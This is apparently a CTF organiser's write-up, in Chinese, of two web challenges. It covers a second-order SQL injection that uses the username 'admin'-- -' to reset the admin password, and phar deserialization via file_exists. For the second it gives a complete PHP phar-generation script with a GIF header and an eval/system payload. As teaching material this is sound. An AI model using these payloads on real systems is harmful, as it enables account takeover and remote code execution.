# Web

## 二次注入

这道题考察的是简单的二次SQL注入，出题壬希望同学们可以通过这道简单的例题初步了解二次SQL注入。

本题的预期内容还包含了通过robots.txt中的内容拿到源码，进行审计，不过似乎出题出的太简单了，大家都没用到。。。

在robots.txt里面包含了如下内容

```
User-agent: *
Disallow: /backup.zip
```

下载下来审计可以看的更明白一些。首先注册和登陆都不存在漏洞，出题壬也就掠过去不讲了，直接看修改密码的地方存在的漏洞

```php
$x=$db->execute("update users set password=? where username='$username' ",['s',&$password]);
```

这里直接将$username拼接到sql语句中了，而这个$username是在注册时选定的，因此想要实现注入，需要在注册的时候，就直接设定用户名为admin'-- -。

这样一来，登陆上去修改密码的时候，sql语句就成了

```sql
update users set password=? where username='admin' -- -'
```

(其中?指的是被绑定的参数，我们无论如何修改它都不会改变原本的语义)
而这个语句中username后面就成了admin' -- -',在MySQL中--[空格]是注释符，把SQL语句后面注释掉了，因此这句话相当于修改admin的密码。

因此在修改密码后登出，就可以用这个密码登陆admin账号获取flag了

## 反序列化？

相信大家看到问号应该知道这道题主要考的不是反序列化了吧（不会真有人在纠结反序列化吧）

### 解题方法

先观察`vulnerable.php`啊，主页上都提示了，发现了一个很显然能导致RCE的类，下面有一个`file_exists`函数，不会有人真觉得这边是检查上传文件是否成功吧。`file_exists`函数再检查phar包的时候会将其解析，利用这点进行代码执行。

使用如下代码生成一个phar包（带上gif文件头，因为上传那边会检查），然后修改后缀名上传即可，然后使用phar协议`phar://upload/xxx.gif`即可拿到flag。

```php

<?php

class Flag
{
    private $code;

    function __construct($my_code)
    {
        $this->code = $my_code;
    }

    function __destruct()
    {
        eval($this->code);
    }
}



$phar = new Phar('phar1.phar');
$phar->stopBuffering();
$phar->setStub('GIF89a' . '<?php __HALT_COMPILER();?>');
$phar->addFromString('test.txt', 'test');
$object = new Flag("system('cat /flag');");
$phar->setMetadata($object);
$phar->stopBuffering();

```
